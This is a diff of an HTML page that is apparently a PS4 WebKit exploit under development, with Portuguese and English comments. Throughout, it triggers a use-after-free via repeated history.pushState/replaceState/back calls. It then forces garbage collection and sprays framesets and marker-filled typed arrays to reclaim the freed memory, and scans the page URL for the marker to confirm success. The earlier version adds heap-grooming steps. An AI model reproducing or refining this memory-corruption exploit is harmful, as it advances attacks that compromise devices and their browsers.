@@ -2,130 +2,101 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Heap Feng Shui + UAF Reclamation</title>
+<title>PS4 WebKit – UAF Reclamation (Minimal Mod)</title>
 <style>
     body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
     button { 
         font-size:14px; padding:12px; margin:5px; 
-        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 350px;
-        text-transform: uppercase; font-weight: bold;
+        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 320px;
     }
     button:hover { background:#0f0; color:#000; }
-    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; color: #aaa; }
-    .success { color: #0f0; font-weight: bold; font-size: 1.2em; }
-    .info { color: #00bfff; }
+    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; }
 </style>
 </head>
 <body>
-<h2>PS4 WebKit: Heap Feng Shui Strategy</h2>
-<div id="status">Status: IDLE</div>
-<button onclick="executeExploit()">RUN RECLAMATION EXPLOIT</button>
+<h2>PS4 WebKit – fastMalloc Exhaustion</h2>
+<div id="status">Ready</div>
+<button onclick="runStepD()">RUN PSFREE RECLAMATION</button>
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m, type="") { 
-    const span = document.createElement("span");
-    if(type) span.className = type;
-    span.textContent = m + "\n";
-    logEl.appendChild(span);
-}
+function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// 1. Forçar Garbage Collection (Baseado no psfree.mjs)
+// Mantendo sua função de GC original
 function gc() {
-    log("Iniciando GC para limpeza...", "info");
-    for(let i=0; i<15; i++) {
-        new Uint8Array(1024 * 1024 * 2); // 2MB cada
+    log("Forcing GC...");
+    for(let i=0; i<10; i++) {
+        new Uint8Array(4 * 1024 * 1024); 
     }
 }
 
-// 2. O seu Gatilho UAF (Ajustado para estabilidade)
+// === SEU UAF ORIGINAL (SEM ALTERAÇÕES NA LÓGICA) ===
 async function triggerBaseUAF() {
-    log("Disparando Gatilho UAF (history.pushState)...", "info");
+    logEl.textContent = "";
+    log("=== STARTING STABLE UAF (i < 48) ===");
     let size = 977;
     const STEP = 14461;
     for(let i=0; i<48; i++){
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-        
-        // Se houver o evento blur, ele entraria aqui
-        if(i % 6 === 0) {
-            setTimeout(() => history.back(), 0);
-        }
+        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
         size += STEP;
+        await sleep(5);
     }
-    await sleep(20);
+    // Reduzi o sleep final de 40 para 10 para o spray não chegar atrasado
+    await sleep(10); 
 }
 
-async function executeExploit() {
-    logEl.textContent = "";
-    document.getElementById("status").textContent = "Status: RUNNING...";
-
-    // --- FASE 1: DEFRAGMENTAÇÃO ---
-    log("Fase 1: Defragmentando Heap (Aterro)...");
-    let anchor = [];
-    for(let i = 0; i < 1500; i++) {
-        anchor.push(new Uint32Array(0x100).fill(0xdeadbeef));
-    }
-
-    // --- FASE 2: HOLE PUNCHING ---
-    log("Fase 2: Hole Punching (Criando lacunas)...");
-    for(let i = 0; i < anchor.length; i += 2) {
-        anchor[i] = null; // Libera blocos intercalados
-    }
-    gc(); // Limpa os blocos nulos para o WebKit reutilizar
-
-    // --- FASE 3: O GATILHO ---
+async function runStepD() {
+    // 1. Gatilho Original
     await triggerBaseUAF();
-
-    // --- FASE 4: SPRAY & RECLAMATION ---
-    log("Fase 4: Spraying para ocupação de memória...");
     
-    // Spray de Framesets (fastMalloc)
+    // 2. O seu GC
+    gc();
+    
+    log("Spraying memory...");
     let sprayFrames = [];
+    let sprayArrays = [];
+    
+    // 3. Spray Agressivo (Minimal Mod: aumentei a quantidade para garantir ocupação)
     const rowsPattern = ",".repeat(254); 
-    for(let i = 0; i < 500; i++) {
+    for(let i = 0; i < 600; i++) { // Aumentado de 400 para 600
         let fset = document.createElement("frameset");
         fset.rows = rowsPattern;
         sprayFrames.push(fset);
-    }
 
-    // Spray de Arrays Controlados
-    let sprayArrays = [];
-    const TARGET_SIZE = 340356; 
-    for(let i = 0; i < 300; i++) {
-        let a = new Uint32Array(TARGET_SIZE / 4);
-        a.fill(0x41424344); // Marcador 'ABCD'
-        sprayArrays.push(a);
-    }
-
-    window.keepAlive = [anchor, sprayFrames, sprayArrays];
-    await sleep(100);
-
-    // --- VERIFICAÇÃO ---
-    let url = document.URL;
-    log("Escaneando memória reclamada...");
-    let found = false;
-    
-    // Verificamos se o marcador 0x44 (D) ou 0x41 (A) substituiu o 'V' na URL
-    for(let off = 0; off < url.length; off++) {
-        let code = url.charCodeAt(off);
-        if(code === 0x44 || code === 0x41) {
-            log(`\n!!! SUCESSO !!!`, "success");
-            log(`Memória Reclamada no Offset [${off}]: 0x${code.toString(16).toUpperCase()}`, "success");
-            log(`O WebKit está lendo nossos dados como se fossem a URL!`, "success");
-            found = true;
-            document.getElementById("status").textContent = "Status: PWNED!";
-            break;
+        // Intercalando alocações de Array para ocupar fastMalloc e JSHeap
+        if(i % 2 === 0) {
+            let a = new Uint32Array(340356 / 4);
+            a.fill(0x41424344); 
+            sprayArrays.push(a);
         }
     }
 
+    window.keepAlive = [sprayFrames, sprayArrays];
+    await sleep(50);
+
+    // 4. Scan de Verificação
+    let url = document.URL;
+    log("Scanning offsets...");
+    let found = false;
+    
+    // Verificando uma range maior da URL para não perder o marcador
+    for(let off = 0; off < url.length; off++) {
+        let code = url.charCodeAt(off);
+        if(code === 0x44 || code === 0x41) {
+            log("SUCCESS! Reclaimed at [" + off + "]: 0x" + code.toString(16).toUpperCase());
+            found = true;
+            break;
+        }
+    }
+    
     if(!found) {
-        log("\nFalha: O marcador não foi encontrado.", "info");
-        log("Tentativa: Aumente o número de âncoras na Fase 1 ou o TARGET_SIZE.");
-        document.getElementById("status").textContent = "Status: FAILED";
+        log("Falha: Marcador não encontrado.");
+        log("Tente aumentar o STEP ou diminuir o sleep pós-UAF.");
     }
 }
 </script>
